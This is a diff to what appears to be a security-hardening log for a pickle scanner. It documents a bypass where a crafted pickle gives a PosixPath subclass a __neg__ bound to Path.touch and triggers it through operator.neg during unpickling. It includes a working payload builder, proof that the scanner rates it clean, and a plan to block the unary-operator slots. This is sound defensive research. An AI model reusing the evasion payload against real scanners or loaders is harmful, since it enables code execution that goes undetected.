@@ -4814,3 +4814,140 @@ Blocking plan:
 
 Performance note: twenty-four literals in the existing magic-method match arm,
 no reflected or in-place operator flow modeling.
+
+## Turn 95 - Unary operator method family gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as a unary operator method, for example
+  `__neg__`.
+- Instantiate the class with a marker path.
+- Call the matching clean `operator` helper, for example
+  `operator.neg(instance)`, during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    return b"U" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_operator_neg_neg_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        text("__neg__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("operator", "neg"),
+        b"h\x01",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 for the `__neg__` representative:
+
+- Control scanner result: `len=134`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=152`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=152`, `bytes_total=152`,
+  `opcode_count=33`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `operator.neg`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `operator.neg` call returns
+  a `DerivedPath` instance at `/tmp/ma_operator_neg_neg_marker` and does not
+  create the marker
+- Unpickle result: the full payload creates
+  `/tmp/ma_operator_neg_neg_marker` and returns `None`
+
+Sibling slot proof:
+
+| Operator | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `operator.neg` | `__neg__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.pos` | `__pos__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.abs` | `__abs__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.invert` | `__invert__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+
+RCE mechanism:
+
+- `type(...)` builds a `pathlib.PosixPath` subclass with an attacker-controlled
+  unary operator slot such as `__neg__ = pathlib.Path.touch`.
+- The payload instantiates that subclass for the marker path.
+- `operator.neg(instance)` dispatches to `instance.__neg__()`.
+- Because `__neg__` points at `Path.touch`, CPython calls
+  `Path.touch(instance)`. Unary operator methods may return arbitrary Python
+  objects, so the `None` result is returned normally after the file is created.
+
+Why the scanner missed it:
+
+- Unary operator dunder slots `__neg__`, `__pos__`, `__abs__`, and
+  `__invert__` are absent from the suspicious magic-method string list.
+- The corresponding `operator` helpers are absent from `DANGEROUS_GLOBALS`;
+  current `operator` coverage includes `call`, `attrgetter`, `itemgetter`, and
+  `methodcaller`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The dangerous callable is hidden as a synthesized unary operator method, so
+  the final visible call target is a common operator helper rather than the
+  attacker-selected callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, attribute hooks, item hooks,
+  containment hooks, comparison hooks, or binary operator hooks.
+
+Performance note: the focused next block should add `__neg__`, `__pos__`,
+`__abs__`, and `__invert__` to the suspicious magic-method string list. That
+keeps the hot path to four additional literals in the existing string policy
+and avoids unary-operator flow modeling.
+
+## Turn 96 - Block unary operator seeds
+
+Blocking plan:
+
+- Add `__neg__`, `__pos__`, `__abs__`, and `__invert__` to the existing
+  suspicious magic-method string list. Unary hooks can route execution through
+  ordinary operator dispatch without an explicit dangerous call target.
+- Leave `operator.neg`, `operator.pos`, `operator.abs`, `operator.invert`,
+  `builtins.type`, `pathlib.PosixPath`, and `pathlib.Path.touch` allowed for
+  this focused block. The static signal is the attacker-controlled unary
+  operator slot name.
+- Add a CPython oracle regression that builds
+  `type(..., {"__neg__": Path.touch})`-style payloads for all four unary
+  slots, verifies scan-time detection on both construction-only controls and
+  active `operator.*` RCE variants, proves the control instances do not create
+  markers, then proves each unary operation creates its marker during
+  `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: four literals in the existing magic-method match arm, no
+unary-operator flow modeling.
